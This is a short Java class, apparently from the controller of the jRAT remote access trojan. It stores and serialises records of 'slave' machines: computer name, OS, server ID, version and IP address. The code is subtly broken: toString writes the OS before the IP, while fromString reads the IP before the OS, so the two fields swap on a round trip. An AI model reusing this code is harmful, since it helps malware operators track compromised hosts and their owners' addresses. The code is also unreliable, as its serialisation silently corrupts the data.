package se.jrat.client;

public class OfflineSlave {

	protected String userstring;
	protected String os;
	protected String serverid;
	protected String version;
	protected String ip;
	
	public OfflineSlave(AbstractSlave slave) {
		this.userstring = slave.getComputerName();
		this.os = slave.formatUserString();
		this.serverid = slave.getServerID();
		this.version = slave.getVersion();
		this.ip = slave.getRawIP();
	}
	
	public OfflineSlave(String serverid, String userstring, String ip, String longosname, String version) {
		this.userstring = userstring;
		this.os = longosname;
		this.serverid = serverid;
		this.version = version;
		this.ip = ip;
	}
	
	public static OfflineSlave fromString(String s) {
		String[] array = s.split(":");
		return new OfflineSlave(array[0], array[1], array[2], array[3], array[4]);
	}
	
	public static String toString(OfflineSlave slave) {
		StringBuilder sb = new StringBuilder();
		sb.append(slave.serverid + ":");
		sb.append(slave.userstring + ":");
		sb.append(slave.os + ":");
		sb.append(slave.ip + ":");
		sb.append(slave.version + ":");
		
		return sb.toString();
	}
	
	@Override
	public String toString() {
		return OfflineSlave.toString(this);
	}

}
